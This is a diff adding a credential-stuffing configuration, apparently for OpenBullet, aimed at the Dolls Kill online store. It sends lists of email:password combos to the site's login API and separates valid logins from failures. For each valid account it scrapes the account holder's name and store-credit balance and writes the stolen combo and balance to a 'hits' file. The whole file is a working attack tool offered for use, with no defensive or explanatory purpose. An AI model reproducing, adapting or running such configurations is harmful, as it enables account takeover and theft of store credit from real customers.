@@ -1,0 +1,90 @@
+[SETTINGS]
+{
+  "Name": "Dolls Kill",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-08-18T18:33:02.6679095+10:00",
+  "AdditionalInfo": "",
+  "Author": "Croppable",
+  "Version": "1.3.5 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Transparent": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.dollskill.com//api/v1/account/customer/?op=login" 
+  CONTENT "email=<USER>&password=<PASS>&page_title=Online+Boutique+for+the+Misfits+%26+Miss+Legits+%7C+Dolls+Kill&page_referrer=https%3A%2F%2Fwww.google.com%2F" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.dollskill.com" 
+  HEADER "referer: https://www.dollskill.com/" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid login or password" 
+  KEYCHAIN Success OR 
+    KEY "Successfully logged in" 
+
+REQUEST POST "https://www.dollskill.com/api/v1/account/dashboard" 
+  CONTENT "info=account_dashboard" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.dollskill.com" 
+  HEADER "referer: https://www.dollskill.com/customer/dollskill_account/" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+
+PARSE "<SOURCE>" LR "=\\\"box-content\\\">\\n<p><strong>" "<\\/strong><br>\\" -> CAP "Name" 
+
+REQUEST POST "https://www.dollskill.com/api/v1/account/dashboard" 
+  CONTENT "info=account_storecredit" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.dollskill.com" 
+  HEADER "referer: https://www.dollskill.com/customer/dollskill_account/" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+
+PARSE "<SOURCE>" LR "span class=\\\"price\\\">" "<\\/span>\\" -> CAP "Store Credits Left" 
+
+PARSE "<SOURCE>" LR "span class=\\\"price\\\">" "<\\/span>\\" -> VAR "Points" 
+
+#Save UTILITY File "-HITS-CROPPABLES_CONFIG/[Hits]_dollskill.txt" AppendLines "[Valid Hit]! | Combo: <USER>:<PASS> | Account Name: <Name> | Balance: <Points>" -> VAR "saveHits" 
+
